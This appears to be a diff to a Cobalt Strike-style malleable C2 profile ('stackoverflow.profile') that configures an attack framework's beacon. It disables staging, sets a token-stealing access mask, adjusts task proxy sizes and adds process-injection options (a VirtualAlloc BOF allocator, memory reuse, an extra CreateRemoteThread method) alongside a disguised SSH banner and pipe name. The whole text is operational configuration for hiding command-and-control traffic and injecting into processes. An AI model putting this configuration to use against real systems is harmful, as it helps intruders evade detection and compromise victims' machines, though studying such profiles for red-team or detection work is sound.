@@ -10,6 +10,8 @@ set data_jitter "50";
 
 set sample_name "stackoverflow.profile";
 
+set host_stage "false";
+
 dns-beacon {
     # Options moved into 'dns-beacon' group in 4.3:
     set dns_idle             "8.8.8.8";
@@ -42,6 +44,14 @@ set tcp_frame_header "";
 ###SSH options###
 set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
 set ssh_pipename "SearchTextHarvester##";
+
+###Steal Token
+set steal_token_access_mask "11";
+
+###Proxy Options
+set tasks_max_size "1048576";
+set tasks_proxy_max_size "921600";
+set tasks_dns_proxy_max_size "71680";
 
 #https-certificate {
 #    set keystore "your_store_file.store";
@@ -272,7 +282,10 @@ stage {
 ###Process Inject Block###
 process-inject {
 
-    set allocator "NtMapViewOfSection";		
+    set allocator "NtMapViewOfSection";
+    
+    set bof_allocator "VirtualAlloc";
+    set bof_reuse_memory "true";
 
     set min_alloc "16700";
 
@@ -301,6 +314,7 @@ process-inject {
 
         CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
 
+        CreateRemoteThread;
         RtlCreateUserThread;
     }
 }
